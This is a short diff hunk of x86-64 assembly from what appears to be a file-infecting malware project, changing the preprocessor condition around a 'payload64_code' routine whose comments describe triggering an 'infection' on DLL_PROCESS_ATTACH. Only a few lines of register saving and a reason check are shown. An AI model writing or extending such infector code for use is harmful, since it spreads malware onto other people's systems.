@@ -25,7 +25,7 @@ payload64_code:
    mov [rsp+0x10],rdi
    mov [rsp+8],rbp
 
-%ifdef INFECTION_TLS
+%ifndef INFECTION_STANDALONE
    cmp edx,1
    jnz infection__end           ; if the given Reason is DLL_PROCESS_ATTACH, do the needful
                                 ; otherwise, terminate the infection.
